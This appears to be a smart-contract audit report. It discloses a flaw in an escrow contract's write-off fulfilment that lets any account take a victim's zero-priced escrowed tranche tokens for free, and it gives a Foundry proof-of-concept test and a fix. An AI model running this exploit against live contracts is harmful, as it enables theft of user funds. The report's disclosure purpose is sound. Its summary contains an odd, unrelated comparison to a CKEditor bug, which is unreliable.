### Title
Zero-price write-off requests let any EOA steal escrowed tranche tokens for free - (File: contracts/IdleCreditVaultWriteOffEscrow.sol)

### Summary
`IdleCreditVaultWriteOffEscrow.fullfillWriteOffRequest` lets any caller satisfy a user's request as long as `_underlyings >= currentRequest.underlyings` and `_tranches == currentRequest.tranches`. When a user creates a request with `underlyingsRequested == 0`, the check degenerates and any unprivileged attacker can pull the victim's escrowed tranche tokens out of the escrow while transferring **zero** underlying — the "malformed input stored then later interpreted" pattern of the CKEditor fake-object bug, mapped onto the escrow's request object.

### Finding Description
`createWriteOffRequest(amount, underlyingsRequested)` stores both fields verbatim with no sanity bound on `underlyingsRequested` (only `amount != 0` is checked). [1](#0-0) 

`fullfillWriteOffRequest` validates only:

```solidity
if (currentRequest.tranches != _tranches || _underlyings < currentRequest.underlyings) {
  revert WrongRequest();
}
``` [2](#0-1) 

It then deletes the request, transfers `_underlyings` (minus fee) to the user, and sends `currentRequest.tranches` to `msg.sender`. [3](#0-2) 

If `currentRequest.underlyings == 0`, an attacker calls `fullfillWriteOffRequest(victim, victimRequest.tranches, 0)`:

- `safeTransferFrom(attacker, escrow, 0)` is a no-op,
- `_exitFee` on `0` is `0`,
- `underlyingToken.safeTransfer(victim, 0)` is a no-op,
- `tranche.safeTransfer(attacker, request.tranches)` hands the attacker the victim's full escrowed tranche balance.

The request is deleted, so `deleteWriteOffRequest` can no longer rescue the tokens. No epoch state, KYC, borrower, or owner involvement is required — the only gate is `isEpochRunning` at creation time, and fulfillment has **no** epoch gating at all, so the theft works even in buffer/stopped states while the victim waits for the borrower to evaluate the request.

### Impact Explanation
Direct theft of user funds: the victim's escrowed tranche tokens (which are live, redeemable claims on vault NAV) are transferred to an attacker for zero consideration. Loss = the full `tranches` amount of any request created with `underlyingsRequested == 0`. Zero-price requests are not exotic — a user may create a request intending to update the price via a subsequent `createWriteOffRequest` call, or via a UI default, or deliberately as a donation; in every case the protocol exposes their collateral to unconditional theft.

### Likelihood Explanation
Requires a victim request with `underlyingsRequested == 0`. Since the escrow is documented as an off-chain negotiated write-off mechanism and amounts are set at creation, a zero price is a plausible intermediate/user-error state — and even one such request in history makes the attack trivially executable by any EOA in a single call, with no capital, no KYC, and no epoch-phase constraint. The attacker can also watch `createWriteOffRequest` events and fulfill in the same block.

### Recommendation
In `fullfillWriteOffRequest`, require a strictly positive payment: revert if `_underlyings == 0` (or if `currentRequest.underlyings == 0`). Alternatively, restrict fulfillment of zero-price requests to the request owner. Optionally also enforce `underlyingsRequested != 0` in `createWriteOffRequest`.

### Proof of Concept
Foundry test sketch (extend `test/foundry/IdleCreditVaultWriteOffEscrow.t.sol`, whose `setUp` already deposits for `LP` and approves the escrow):

```solidity
function testStealZeroPriceWriteOffRequest() external {
    // LP (victim) creates a write-off request asking 0 underlyings
    vm.prank(LP);
    escrow.createWriteOffRequest(10_000e18, 0);

    address attacker = makeAddr("attacker"); // any EOA, no funds, no KYC
    uint256 tranchePre = tranche.balanceOf(attacker);

    vm.prank(attacker);
    escrow.fullfillWriteOffRequest(LP, 10_000e18, 0); // pays nothing

    (uint256 tranches, uint256 underlyings) = escrow.userRequests(LP);
    assertEq(tranches, 0, "request not cleared");
    assertEq(tranche.balanceOf(attacker) - tranchePre, 10_000e18, "attacker stole tranches for free");

    // victim cannot recover the escrowed tokens
    vm.prank(LP);
    vm.expectRevert(abi.encodeWithSelector(Is0.selector));
    escrow.deleteWriteOffRequest();
}
```

Sequence: epoch running (buffer or running phase, since `fullfillWriteOffRequest` is not epoch-gated), victim creates a zero-price request, attacker fulfills it and receives all escrowed tranche tokens at zero cost.

  function createWriteOffRequest(uint256 amount, uint256 underlyingsRequested) external nonReentrant {
    // can request write off only when epoch is running
    if (!IdleCDOEpochVariant(idleCDOEpoch).isEpochRunning()) revert EpochNotRunning();
    // cannot request write off with 0 tranche tokens
    if (amount == 0) revert NotAllowed();

    // get tranche tokens from user
    IERC20Detailed(tranche).safeTransferFrom(msg.sender, address(this), amount);
    // get current write-off request
    WriteOffRequest memory currentRequest = userRequests[msg.sender];
    // update user requests
    userRequests[msg.sender] = WriteOffRequest({
      tranches: currentRequest.tranches + amount,
      underlyings: currentRequest.underlyings + underlyingsRequested
    });
    pendingUnderlyings += underlyingsRequested;
```

  function fullfillWriteOffRequest(address _user, uint256 _tranches, uint256 _underlyings) external nonReentrant {
    // get current write-off request
    WriteOffRequest memory currentRequest = userRequests[_user];
    // check if the user has a write-off request
    if (currentRequest.tranches == 0) revert Is0();
    // check if the request matches at least the expected values (borrower can choose to overpay if needed, but not underpay)
    if (currentRequest.tranches != _tranches || _underlyings < currentRequest.underlyings) {
      revert WrongRequest();
    }
```
